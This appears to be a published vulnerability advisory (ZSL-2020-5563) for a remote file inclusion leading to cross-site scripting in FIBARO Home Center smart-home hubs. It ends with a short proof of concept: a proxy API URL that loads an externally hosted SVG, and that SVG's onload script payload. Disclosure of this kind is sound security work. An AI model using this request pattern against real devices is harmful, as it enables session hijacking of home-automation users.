@@ -1,0 +1,56 @@
+# Exploit Title: FIBARO System Home Center 5.021 - Remote File Include
+# Date: 2020-03-22
+# Author: LiquidWorm
+# Vendor: https://www.fibaro.com
+# CVE: N/A
+
+Vendor: FIBAR GROUP S.A.
+Product web page: https://www.fibaro.com
+Affected version: Home Center 3, Home Center 2, Home Center Lite
+                  5.021.38
+                  4.580
+                  4.570
+                  4.540
+                  4.530
+                  4.510
+                  4.180
+
+
+Summary: Imagine that you live in a house where everything happens by itself.
+FIBARO Smart Home takes care of your everyday comfort and safety of all family
+members and in the meantime, saves energy on every single occasion. All this is
+possible thanks to Home Center 2 smart home HUB. Home Center 2 is an indispensable
+part of the FIBARO System without which the rest devices of home automation would
+be only beautiful objects. The smart home HUB collects and analyzes information
+about devices, communicates them with each other and thus directs the operation
+of the entire system and takes care of its security.
+
+Desc: The smart home solution is vulnerable to a remote Cross-Site Scripting
+triggered via a Remote File Inclusion issue by including arbitrary client-side
+dynamic scripts (JavaScript, VBScript) due to the undocumented proxy API and its
+url GET parameter. This allows hijacking the current session of the user or
+changing the look of the page by changing the HTML.
+
+Tested on: Apache/2.2.16 (Debian)
+           nginx/1.9.5
+           nginx/1.8.0
+           lighttpd/1.4.41
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2020-5563
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2020-5563.php
+
+
+04.02.2020
+
+--
+
+
+http://10.0.0.2:8880/api/proxy?url=https://www.zeroscience.mk/pentest/XSS.svg
+
+$ cat /pentest/XSS.svg
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
